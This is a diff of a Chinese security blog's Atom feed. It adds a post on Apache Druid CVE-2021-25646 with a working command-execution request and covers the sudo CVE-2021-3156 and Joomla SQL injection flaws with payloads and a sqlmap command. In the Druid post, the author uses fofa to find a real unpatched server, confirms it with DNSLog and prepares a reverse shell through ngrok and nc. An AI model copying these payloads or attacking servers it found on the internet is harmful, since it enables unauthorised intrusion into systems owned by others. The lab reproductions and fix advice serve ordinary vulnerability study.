@@ -1,27 +1,49 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <title>Hexo</title>
+  <title>h00ls</title>
   
   
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-02-04T05:16:34.401Z</updated>
+  <updated>2021-02-05T08:34:38.774Z</updated>
   <id>http://example.com/</id>
   
   <author>
-    <name>John Doe</name>
+    <name>h00ls</name>
     
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Apache Druid未授权命令执行(CVE-2021-25646)</title>
+    <link href="http://example.com/2021/02/05/Apache-Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2021-25646/"/>
+    <id>http://example.com/2021/02/05/Apache-Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2021-25646/</id>
+    <published>2021-02-05T08:32:31.000Z</published>
+    <updated>2021-02-05T08:34:38.774Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Apache-Druid未授权命令执行-CVE-2021-25646"><a href="#Apache-Druid未授权命令执行-CVE-2021-25646" class="headerlink" title="Apache Druid未授权命令执行(CVE-2021-25646)"></a>Apache Druid未授权命令执行(CVE-2021-25646)</h2><p>小白文章，大佬绕过。如有不足，请大家多多指点，提前谢谢各位大佬！</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Druid &lt; 0.20.1</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载<code>apache-druid-0.20:</code><a href="https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz">https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz</a></p><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf apache-druid-0.20.0-bin.tar.gz</span><br><span class="line">cd apache-druid-0.20.0</span><br><span class="line">.&#x2F;bin&#x2F;start-micro-quickstart</span><br></pre></td></tr></table></figure><p>启动后服务绑定在8888端口，浏览器可以正常访问则表示环境启动成功</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先查看<code>/tmp</code>目录下的文件</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="image-20210204181647791"></p><p>访问8888端口后，点击<code>Load data</code>，抓包</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="image-20210204181708981"></p><p>具体内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler HTTP&#x2F;1.1</span><br><span class="line">Host: ip:prot</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 1045</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https:&#x2F;&#x2F;xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;&#x2F;bin&#x2F;bash -c $@|bash 0 ping dns.com&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</span><br></pre></td></tr></table></figure><p>在<code>/tmp</code>目录下创建一个新的<code>test</code>文件夹。</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="image-20210204181726708"></p><p>攻击成功。</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>建议广大用户及时更新Apache Druid，下载链接为：</p><p><a href="https://druid.apache.org/downloads.html">https://druid.apache.org/downloads.html</a></p><p><a href="https://github.com/apache/druid/releases/tag/druid-0.20.1">https://github.com/apache/druid/releases/tag/druid-0.20.1</a></p><h3 id="实战环节"><a href="#实战环节" class="headerlink" title="实战环节"></a>实战环节</h3><p>复现完了，就开始实战，想看看还有没有人漏网之鱼。于是乎上了神器<code>fofa</code>就是一顿搜索，</p><p><img src="/images/image-20210205143455851.png" alt="image-20210205143455851"></p><p>遇到的都是这样的，<code>load data</code>点击不了，只好放弃。</p><p><img src="/images/image-20210205143543088.png" alt="image-20210205143543088"></p><p>翻着翻着，就看到一条漏网之鱼，下面还温馨的告诉运行的版本号是<code>0.17.1</code>，这不是刚好符合漏洞版本。</p><p><img src="/images/image-20210205143600088.png" alt="image-20210205143600088"></p><p>先去DNSLog看一下，是否存在漏洞。多看了几遍。。。</p><p><img src="/images/image-20210205144918650.png" alt="image-20210205144918650"></p><p>那就可以反弹shell了嘛。最近腾讯云搞活动，贵了，以前学生9元钱一个月，现在最低买三个月，只好用ngrok做个端口转发</p><p><img src="/images/image-20210205144054231.png" alt="image-20210205144054231"></p><p>运行./sunny clientid 隧道id</p><p><img src="/images/mbxr1YNnM5pg9AK.png" alt="image-20210205144134603"></p><p>本地监听3333端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 3333</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210205144204339.png" alt="image-20210205144204339"></p><p>看情况是个人VPS到此收工。没有什么好继续进行的了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Apache-Druid未授权命令执行-CVE-2021-25646&quot;&gt;&lt;a href=&quot;#Apache-Druid未授权命令执行-CVE-2021-25646&quot; class=&quot;headerlink&quot; title=&quot;Apache Druid未授权命令执行(CVE-</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Linux sudo提权(CVE-2021-3156)</title>
     <link href="http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/"/>
     <id>http://example.com/2021/02/02/Linux-sudo%E6%8F%90%E6%9D%83-CVE-2021-3156/</id>
     <published>2021-02-02T09:25:02.000Z</published>
-    <updated>2021-02-04T05:16:34.401Z</updated>
+    <updated>2021-02-04T05:21:57.781Z</updated>
     
     <content type="html"><![CDATA[<h1 id="Linux-sudo-权限提升-CVE-2021-3156"><a href="#Linux-sudo-权限提升-CVE-2021-3156" class="headerlink" title="Linux sudo 权限提升(CVE-2021-3156)"></a>Linux sudo 权限提升(CVE-2021-3156)</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><blockquote><p>sudo 1.8.2 ~ 1.8.31p2</p><p>sudo 1.9.0 ~ 1.9.5p1</p></blockquote><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>以非 root 用户执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x2F;</span><br></pre></td></tr></table></figure><p>存在漏洞</p><p><img src="/images/image-20210202175040378.png" alt="image-20210202175040378"></p><p>不存在漏洞</p><p><img src="/images/yErg56.png" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>工具：<a href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></p><p>编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2021-3156</span><br><span class="line"></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>使用工具</p><p><img src="/images/image-20210202174235752.png" alt="image-20210202174235752"></p><p>提权成功</p><p><img src="/images/image-20210202174316368.png" alt="image-20210202174316368"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修复升级到更新版本</p>]]></content>
     
@@ -409,28 +431,6 @@
     <category term="Solr 远程命令执行" scheme="http://example.com/tags/Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
     <category term="CVE-2019-0193" scheme="http://example.com/tags/CVE-2019-0193/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>joomla之sql注入</title>
-    <link href="http://example.com/2019/11/05/joomla%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/"/>
-    <id>http://example.com/2019/11/05/joomla%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/</id>
-    <published>2019-11-05T13:06:27.000Z</published>
-    <updated>2019-11-06T08:12:49.275Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Joomla-3-7-0-Core-com-fields组件SQL注入"><a href="#Joomla-3-7-0-Core-com-fields组件SQL注入" class="headerlink" title="Joomla 3.7.0 Core com_fields组件SQL注入"></a>Joomla 3.7.0 Core com_fields组件SQL注入</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 </p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。</p><a id="more"></a><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol><li><p>可以直接用docker：<code>https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917 </code>直接登录<code>http://target:8080/</code>。</p></li><li><p>网站源码：<code>https://github.com/joomla/joomla-cms/releases/download/3.7.0/Joomla_3.7.0-Stable-Full_Package.zip</code></p></li></ol><p>进入安装界面</p><p><img src="/images/1572959299592.png" alt="1572959299592"></p><p><img src="/images/1572959346422.png" alt="1572959346422"></p><p><img src="/images/1572959457487.png" alt="1572959457487"></p><p>确认安装即可。</p><p><img src="/images/1572959503531.png" alt="1572959503531"></p><p>访问主页</p><p><img src="/images/1572963875436.png" alt="1572963875436"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问</p><p><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</code></p><p><img src="/images/1572963931832.png" alt="1572963931832"></p><p>使用sqlmap直接能跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.10.10.24&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml*&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/1573024005832.png" alt="1573024005832"></p><h3 id="进一步渗透思路"><a href="#进一步渗透思路" class="headerlink" title="进一步渗透思路"></a>进一步渗透思路</h3><p>获取网站后台登录的用户名密码  —》 上传shell  –》 菜刀连接</p><p>获取mysql用户名的hash –》 解密  –》 远程连接mysql  –》 写入木马  –》菜刀连接</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li>及时到官网更新最新版本的joomla</li><li>一定要将数据库的用户权限最小化，以免带来更大的危险</li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;Joomla-3-7-0-Core-com-fields组件SQL注入&quot;&gt;&lt;a href=&quot;#Joomla-3-7-0-Core-com-fields组件SQL注入&quot; class=&quot;headerlink&quot; title=&quot;Joomla 3.7.0 Core com_fields组件SQL注入&quot;&gt;&lt;/a&gt;Joomla 3.7.0 Core com_fields组件SQL注入&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 &lt;/p&gt;
-&lt;h3 id=&quot;漏洞危害&quot;&gt;&lt;a href=&quot;#漏洞危害&quot; class=&quot;headerlink&quot; title=&quot;漏洞危害&quot;&gt;&lt;/a&gt;漏洞危害&lt;/h3&gt;&lt;p&gt;攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="joomla" scheme="http://example.com/tags/joomla/"/>
-    
-    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
